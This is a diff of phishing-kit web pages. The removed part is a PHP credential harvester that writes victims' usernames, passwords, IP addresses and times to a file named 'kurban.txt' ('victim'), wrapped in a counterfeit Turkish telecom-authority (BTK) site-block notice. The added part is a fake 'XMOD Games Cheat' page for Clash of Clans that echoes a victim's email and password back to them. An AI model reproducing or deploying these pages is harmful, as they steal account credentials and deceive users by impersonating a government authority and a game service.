@@ -1,169 +1,84 @@
-<?php
-$username = $_POST['username'];
-$password = $_POST['password'];
-$ip = $_SERVER['REMOTE_ADDR'];
-date_default_timezone_set('Europe/Istanbul');  
-$cur_time=date("d-m-Y H:i:s");
-$file = fopen('kurban.txt', 'a');
-fwrite($file, $username. " ----Sifre----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
-fclose($file); 
-?>
-
 <!DOCTYPE html>
-
 <html>
-  <head>
-   <meta http-equiv="Content-Type" content="text/html; charset=utf8">   
-	<title>Bilgi Teknolojileri ve İletişim Kurumu</title>
- <style type="text/css">
- 
-	.erisime_engellenmis {
-		font-family: Arial, Helvetica, sans-serif;
-		font-size: 32px;
-		font-weight: bold;
-		color: #0000FF;
-		text-decoration: none;
-		text-align: center;
-		border-right-width: 1px;
-		border-left-width: 1px;
-		border-right-style: none;
-		border-left-style: none;
-		border-right-color: #0000FF;
-		border-left-color: #0000FF;
-		border-top-width: 1px;
-		border-top-style: none;
-		border-top-color: #0000FF;
-		border-bottom-width: 1px;
-		border-bottom-style: none;
-		border-bottom-color: #0000FF;
-	}
-	.yazi1 {
-		font-family: Georgia, "Times New Roman", Times, serif;
-		font-size: 12px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #666666;
-		text-decoration: none;
-	}
-	.yazi2 {
-		font-family: Georgia, "Times New Roman", Times, serif;
-		font-size: 12px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #6565FF;
-		text-decoration: none;
-	}
-	.yazi3 {
-		font-family: Georgia, "Times New Roman", Times, serif;
-		font-size: 10px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #BB65FF;
-		text-decoration: none;
-		padding-bottom: 10px;
-	}
-	.yazi2_1 {
-		font-family: Verdana, "Times New Roman", Times, serif;
-		font-size: 12px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #6565FF;
-		text-decoration: none;
-		padding-bottom: 10px;
-	}
-	.yazi3_1 {
-		font-family: Verdana, "Times New Roman", Times, serif;
-		font-size: 10px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #BB65FF;
-		text-decoration: none;
-		padding-bottom: 10px;
-	}
-	
-	a.link:link {
-		font-family: Georgia, "Times New Roman", Times, serif;
-		font-size: 11px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #0000FF;
-		text-decoration: underline;
-	}
-	a.link:active {
-		font-family: Georgia, "Times New Roman", Times, serif;
-		font-size: 11px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #0000FF;
-		text-decoration: underline;
-	}
-	a.link:visited {
-		font-family: Georgia, "Times New Roman", Times, serif;
-		font-size: 11px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #0000FF;
-		text-decoration: underline;
-	}
-	a.link:hover {
-		font-family: Georgia, "Times New Roman", Times, serif;
-		font-size: 11px;
-		line-height: 140%;
-		font-weight: normal;
-		color: #BB65FF;
-		text-decoration: none;
-	}
-	.alticizgili_genisliktd {
-		height: 100%;
-		width: 100%;
-		padding-top: 20px;
-		border-bottom-width: 1px;
-		border-bottom-style: dotted;
-		border-bottom-color: #DDCCFE;
-		padding-bottom: 10px;
-		text-align: center;
-	}
-	.genisliktd {
-		height: 100%;
-		width: 100%;
-		padding-top: 20px;
-		text-align: center;
-	}
-	.genisliktdbaslik {
-		height: 100%;
-		width: 100%;
-		padding-top: 20px;
-		text-align: left;
-		border-bottom-width: 5px;
-		border-bottom-style: solid;
-		border-bottom-color: #DDCCFE;
-	} 
- </style>
- <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
- </head>  
-  <body onselectstart="return false" bgcolor="aliceblue">
-  <div>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<link href='img/mod.png' rel='icon' type='image/x-png'/>
+<title>Clash of Clans - XMOD Games Cheat</title>
+<script src="js/jquery.min.js"></script>
+<link rel="stylesheet" href="css/bootstrap.min.css">
+<style>
+h1, .h1, h2, .h2, h3, .h3 {
+    margin-top: 0px;
+    margin-bottom: 10.5px;
+}
+body { 
+  background: url(img/background.png) no-repeat center center fixed; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+.col-md-6 {
+ margin:0 auto;
+ float:none;
 
-  <table border ="0" align="center" cellpadding="0" cellspacing="0" width="1024" height="100%"> 
-<tr> <td class="alticizgili_genisliktd">
- <span class="yazi1">5651 sayılı kanun kapsamında yapılan teknik inceleme ve hukuki değerlendirme sonucunda alınan <span class="yazi2_1">Bilgi Teknolojileri ve İletişim Kurumu</span><span class="yazi1">'nun</span><span class="yazi2_1"> 01/01/1071</span><span class = "yazi1"> tarih ve </span><span class="yazi2_1">
-			  490.05.01.2017.-431792 </span><span class="yazi1">sayılı kararına istinaden bu internet sitesi</span><span class="yazi2_1">(SİTENİZİN ADI)</span><span class="yazi1"> hakkında idari tedbir uygulanmaktadır.</span>
+}
+.col-md-8 {
+ margin:0 auto;
+ float:none;
 
-		      <br>
-		      <br>
-		      <span class="yazi3_1">After technical analysis and legal consideration based on the law nr. 5651, administration measure has been taken for this website  
-		      (SİTENİZİN ADI) according to decision nr. 490.05.01.2017.-431792 dated 01/01/1071 of the Information and Communication Technologies Authority.</span>
-<br>
-<br>
-<br>		   
+}
+</style>
+<div style="border: 1px #ff6600 solid; padding: 10px; background-color: #ff6600; text-align: left"><center><font size="5"><font color="white">XMOD Games Cheat</font></font></center> </div>
+<body style="padding:0px;margin:0 auto;">
+<div style="padding:0px;margin:0 auto;" class="container ">
+
+<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
+<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
+<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="img/header.jpg"/>
+</div>
+<center style="background:#ff6600;"><br>
+<div class="col-md-8">
+<h2><img height="200" width="200" src="img/mod.png"></h2>
+<h2>
+  XMOD Games Cheat
+</h2>
+<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#00cc00;width:100%" class="form-horizontal">
+<h4 >
+  Your Cheat Status
+  </h4><br/>
+
+<form action="home.php" method="POST">
+<h4 >
+  Your account has been processed
+  </h4></br>
+<h4 >
+  This is your account information
+  </h4>
+<div style="width:100%" class="form-group">
+  <input class="form-control" name="email"  placeholder="<? php echo $email; ?>" type="email" required>
+</div>
+<div style="width:100%" class="form-group">
+  <input class="form-control" name="pass" placeholder="<? php echo $th; ?>" type="text" required>
+</div>
+<h4 >
+  Cheat you will soon be active. </h4>
+  <h4>
+  Time will be active cheat can not be predicted.
+  </h4>
+  </br>
+<div style="text-align:left" class="error-msg" id="hasilnya"></div>
+<div style="width:100%" class="form-group">
+  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #3399ff;" id="gsubmit" value="Logout"> </form>
+
   
-	   <a class="link" target = "_blank" href="http://www.btk.gov.tr">http://www.btk.gov.tr</a>&nbsp;|
-	   <a class="link" target = "_blank" href="http://www.guvenlinet.org">http://www.guvenlinet.org</a>&nbsp;|
-	   <a class="link" target = "_blank" href="http://www.ihbarweb.org.tr">http://www.ihbarweb.org.tr</a>
-	   </td>
-   </tr>
-       
-  </table>
-  </div> 
-  </body>
-</html>
+
+
